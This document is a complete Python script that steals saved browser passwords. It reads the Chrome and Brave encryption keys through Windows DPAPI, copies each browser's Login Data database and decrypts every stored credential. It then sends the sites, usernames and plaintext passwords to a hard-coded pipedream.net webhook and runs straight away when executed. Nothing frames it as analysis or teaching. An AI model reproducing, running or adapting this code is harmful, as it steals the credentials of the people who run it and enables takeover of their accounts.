import os
import json
import base64
import shutil
import sqlite3
import time
import win32crypt
import requests
from datetime import datetime, timedelta
from Crypto.Cipher import AES

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def send_to_webhook(data):
    url = "https://26cfbabd57df0f43399267af77839a16.m.pipedream.net"
    headers = {"Content-Type": "application/json"}
    response = requests.post(url, headers=headers, json=data)
    if response.status_code == 200:
        print("Output sent to webhook successfully!")
    else:
        print(f"Failed to send output to webhook. Status code: {response.status_code}")

def chrome_pass():
    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except Exception as e:
            print(f"Error decrypting password: {e}")
            return ""

    def main():
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        output_data = []
        for row in cursor.fetchall():
            origin_url, action_url, username, password, date_created, date_last_used = row
            if username or password:
                password = decrypt_password(password, key)
                creation_date = str(get_chrome_datetime(date_created)) if date_created != 86400000000 and date_created else ""
                last_used_date = str(get_chrome_datetime(date_last_used)) if date_last_used != 86400000000 and date_last_used else ""
                output_data.append({
                    "Origin URL": origin_url,
                    "Action URL": action_url,
                    "Username": username,
                    "Password": password,
                    "Creation Date": creation_date,
                    "Last Used Date": last_used_date
                })
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except Exception as e:
            print(f"Error removing file: {e}")
        return output_data

    output_data = main()
    send_to_webhook(output_data)

def brave_pass():
    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "BraveSoftware", "Brave-Browser",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except Exception as e:
            print(f"Error decrypting password: {e}")
            return ""

    def main():
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "BraveSoftware", "Brave-Browser", "User Data",
                                "Default", "Login Data")
        filename = "BraveData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        output_data = []
        for row in cursor.fetchall():
            origin_url, action_url, username, password, date_created, date_last_used = row
            if username or password:
                password = decrypt_password(password, key)
                creation_date = str(get_chrome_datetime(date_created)) if date_created != 86400000000 and date_created else ""
                last_used_date = str(get_chrome_datetime(date_last_used)) if date_last_used != 86400000000 and date_last_used else ""
                output_data.append({
                    "Origin URL": origin_url,
                    "Action URL": action_url,
                    "Username": username,
                    "Password": password,
                    "Creation Date": creation_date,
                    "Last Used Date": last_used_date
                })
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except Exception as e:
            print(f"Error removing file: {e}")
        return output_data

    output_data = main()
    send_to_webhook(output_data)

chrome_pass()
brave_pass()
